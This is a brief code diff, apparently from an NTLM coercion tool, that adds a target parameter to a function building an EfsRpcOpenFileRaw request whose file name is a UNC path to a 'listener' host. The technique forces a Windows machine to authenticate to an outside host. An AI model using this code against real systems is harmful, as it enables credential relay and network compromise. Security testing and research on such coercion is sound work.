@@ -18,7 +18,7 @@ class EfsRpcOpenFileRawResponse(NDRCALL):
     structure = ()
 
 
-def request(dce, listener):
+def request(dce, target, listener):
     request = EfsRpcOpenFileRaw()
     request["FileName"] = f"\\\\{listener}\\test\\Settings.ini\x00"
     request["Flags"] = 0
